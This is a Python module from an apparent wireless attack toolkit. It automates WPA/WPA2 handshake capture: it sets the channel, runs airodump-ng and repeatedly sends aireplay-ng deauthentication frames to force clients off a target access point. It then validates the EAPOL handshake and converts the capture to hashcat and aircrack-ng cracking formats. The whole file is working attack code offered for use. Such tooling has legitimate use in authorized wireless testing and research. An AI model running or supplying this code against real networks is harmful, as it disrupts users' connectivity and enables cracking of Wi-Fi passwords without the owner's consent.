"""WPA/WPA2 handshake capture module.

Orchestrates airodump-ng (capture) and aireplay-ng (deauth triggers) to
obtain a complete 4-way EAPOL handshake.  Provides validation and
conversion helpers for hashcat/aircrack-ng.
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path

from wafford.constants import DEFAULT_ATTACK_TIMEOUT, TEMP_DIR
from wafford.core.base import AttackPhase, AttackResult, BaseAttack
from wafford.exceptions import AttackError, ValidationError


@dataclass
class HandshakeInfo:
    """Status of a handshake capture."""

    bssid: str = ""
    capture_path: str = ""
    status: str = "none"  # none | partial | complete | invalid
    eapol_count: int = 0
    clients: set[str] = field(default_factory=set)
    packets: int = 0
    elapsed: float = 0.0


class HandshakeCapture(BaseAttack):
    """Full WPA/WPA2 handshake capture flow.

    1.  Set channel on the interface.
    2.  Start ``airodump-ng`` writing to a pcap file.
    3.  Wait for a client to appear (optional deauth trigger).
    4.  Send deauth frames to force reassociation.
    5.  Verify the captured EAPOL messages.
    6.  Convert the capture to the requested crack format.
    """

    name = "handshake"

    def __init__(
        self,
        interface: str = "",
        *,
        output_dir: str | Path | None = None,
    ) -> None:
        super().__init__(interface)
        self.output_dir = Path(output_dir) if output_dir else TEMP_DIR
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.handshake = HandshakeInfo()
        self._airodump_proc: asyncio.subprocess.Process | None = None

    # ── Public API ────────────────────────────────────────────────────────

    async def capture(
        self,
        bssid: str,
        channel: int,
        duration: int = DEFAULT_ATTACK_TIMEOUT,
        deauth_interval: float = 5.0,
    ) -> AttackResult:
        """Run the full capture + deauth-trigger flow.

        Returns ``AttackResult`` with ``capture_file`` set on success.
        """
        self._validate_mac(bssid, "bssid")
        if not 1 <= channel <= 194:
            raise ValidationError(f"Invalid channel: {channel}", field="channel")

        timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        prefix = bssid.replace(":", "-").upper()
        self.handshake = HandshakeInfo(bssid=bssid)
        cap_base = self.output_dir / f"{prefix}_{timestamp}"

        self._info("Starting handshake capture on ch%d for BSSID %s", channel, bssid)
        self._emit("handshake.capture_start", {"bssid": bssid, "channel": channel})

        self.status.phase = AttackPhase.RUNNING
        self._emit("attack.started")

        # 1 — Set channel
        await self._set_channel(channel)

        # 2 — Start airodump-ng in background
        airodump_cmd = [
            "airodump-ng",
            self.interface,
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", str(cap_base),
            "--output-format", "cap",
            "--write-interval", "1",
        ]
        self._airodump_proc = await asyncio.create_subprocess_exec(
            *airodump_cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        self._processes.append(self._airodump_proc)
        self._info("airodump-ng started (pid %d)", self._airodump_proc.pid)
        await asyncio.sleep(3)  # let airodump settle

        # 3 — Deauth trigger loop
        deauth_sent = 0
        deadline = time.monotonic() + duration
        while time.monotonic() < deadline and not self._cancel_event.is_set():
            argv = [
                "aireplay-ng", "--deauth", "5",
                "-a", bssid,
                "--ignore-negative-one",
                self.interface,
            ]
            rc, _, stderr = await self._run_cmd(argv, timeout=15)
            deauth_sent += 1
            self._emit("handshake.deauth_trigger", {"round": deauth_sent})

            # Check if we already have a valid handshake
            actual_cap = self._find_cap_file(cap_base)
            if actual_cap:
                valid = await self._validate_handshake_internal(actual_cap)
                if valid.status == "complete":
                    self.handshake.capture_path = actual_cap
                    self.handshake.status = "complete"
                    self._info("Complete handshake captured in %d deauth rounds", deauth_sent)
                    break

            remaining = deadline - time.monotonic()
            sleep_time = min(deauth_interval, max(remaining, 0.1))
            try:
                await asyncio.wait_for(self._cancel_event.wait(), timeout=sleep_time)
                break  # cancelled
            except TimeoutError:
                pass

        # 4 — Stop airodump
        await self._stop_airodump()

        # 5 — Final validation
        actual_cap = self._find_cap_file(cap_base)
        if actual_cap:
            self.handshake.capture_path = actual_cap
            info = await self._validate_handshake_internal(actual_cap)
            self.handshake.status = info.status
            self.handshake.eapol_count = info.eapol_count
            self.handshake.packets = info.packets
        else:
            self.handshake.status = "invalid"

        self.handshake.elapsed = self.status.elapsed
        success = self.handshake.status in ("complete", "partial")
        msg = (
            f"Handshake status: {self.handshake.status} "
            f"(EAPOLs={self.handshake.eapol_count})"
        )
        self._emit("handshake.capture_done", {"status": self.handshake.status})

        return AttackResult(
            success=success,
            message=msg,
            capture_file=self.handshake.capture_path,
            time_taken=self.status.elapsed,
            extra={"handshake": self.handshake},
        )

    async def validate_handshake(self, cap_file: str) -> HandshakeInfo:
        """Check a pcap file for a complete 4-way EAPOL handshake."""
        return await self._validate_handshake_internal(cap_file)

    async def convert_to_hccapx(self, cap_file: str, output_file: str) -> str:
        """Convert .cap to hccapx format (aircrack-ng)."""
        self._require_tool("aircrack-ng")
        argv = [
            "aircrack-ng",
            "-j", output_file,
            cap_file,
        ]
        rc, stdout, stderr = await self._run_cmd(argv, timeout=30)
        if rc != 0:
            raise AttackError(f"aircrack-ng hccapx conversion failed: {stderr[:200]}")
        return output_file

    async def convert_to_hashcat(self, cap_file: str, output_file: str) -> str:
        """Convert .cap to hc22000 format via hcxpcapngtool."""
        self._require_tool("hcxpcapngtool")
        # Convert cap → pcapng first (hcxpcapngtool works best on pcapng)
        tmp_pcapng = cap_file.rsplit(".", 1)[0] + ".pcapng"
        conv1 = await self._run_cmd(
            ["editcap", "-T", "1", cap_file, tmp_pcapng],
            timeout=30,
        )
        if conv1[0] == -1:
            # editcap not available; try direct
            tmp_pcapng = cap_file
        argv = [
            "hcxpcapngtool",
            "-o", output_file,
            tmp_pcapng,
        ]
        rc, stdout, stderr = await self._run_cmd(argv, timeout=60)
        if rc != 0:
            raise AttackError(f"hcxpcapngtool conversion failed: {stderr[:200]}")
        return output_file

    def get_handshake_status(self) -> str:
        """Return ``'complete'``, ``'partial'``, ``'invalid'``, or ``'none'``."""
        return self.handshake.status

    # ── Internals ─────────────────────────────────────────────────────────

    async def _set_channel(self, channel: int) -> None:
        rc, _, stderr = await self._run_cmd(
            ["iw", "dev", self.interface, "set", "channel", str(channel)],
            timeout=5,
        )
        if rc != 0:
            raise AttackError(f"Failed to set channel {channel}: {stderr[:120]}")

    async def _stop_airodump(self) -> None:
        if self._airodump_proc and self._airodump_proc.returncode is None:
            self._airodump_proc.terminate()
            try:
                await asyncio.wait_for(self._airodump_proc.wait(), timeout=5)
            except TimeoutError:
                self._airodump_proc.kill()
            if self._airodump_proc in self._processes:
                self._processes.remove(self._airodump_proc)
            self._airodump_proc = None

    def _find_cap_file(self, cap_base: Path) -> str | None:
        """Find the actual cap file airodump wrote (may have a -01 suffix)."""
        for suffix in ("", "-01"):
            candidate = str(cap_base) + suffix + ".cap"
            if Path(candidate).is_file():
                return candidate
        # Glob for any matching pattern
        matches = sorted(
            str(p) for p in cap_base.parent.glob(cap_base.name + "*.cap") if p.is_file()
        )
        return matches[0] if matches else None

    async def _validate_handshake_internal(self, cap_file: str) -> HandshakeInfo:
        """Use aircrack-ng to check for EAPOL messages in a cap file."""
        info = HandshakeInfo(capture_path=cap_file)
        if not Path(cap_file).is_file():
            info.status = "invalid"
            return info

        rc, stdout, _ = await self._run_cmd(
            ["aircrack-ng", cap_file],
            timeout=15,
        )
        output = stdout + _

        # aircrack-ng reports WPA handshakes
        eapol_count = 0
        for line in output.splitlines():
            lower = line.lower()
            if "eapol" in lower:
                eapol_count += 1
            if "wpa" in lower and ("1 handshake" in lower or "handshake" in lower):
                info.status = "complete"
            # Count clients
            m = re.search(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", line)
            if m and "BSSID" not in line and "Station" not in line:
                info.clients.add(m.group(1).upper())

        info.eapol_count = eapol_count

        if info.status != "complete":
            if eapol_count >= 1:
                info.status = "partial"
            else:
                info.status = "invalid"

        # Packet count via tcpdump if available
        rc2, capout, _ = await self._run_cmd(
            ["tcpdump", "-r", cap_file, "-c", "10000", "-q"],
            timeout=10,
        )
        if rc2 == 0:
            m2 = re.search(r"(\d+) packets captured", capout)
            if m2:
                info.packets = int(m2.group(1))

        return info

    async def _cleanup(self) -> None:
        await self._stop_airodump()
        await super()._cleanup()

    @staticmethod
    def _validate_mac(mac: str, field_name: str = "mac") -> None:
        parts = mac.split(":")
        if len(parts) != 6 or not all(0 <= int(p, 16) <= 255 for p in parts):
            raise ValidationError(f"Invalid MAC address: {mac}", field=field_name)
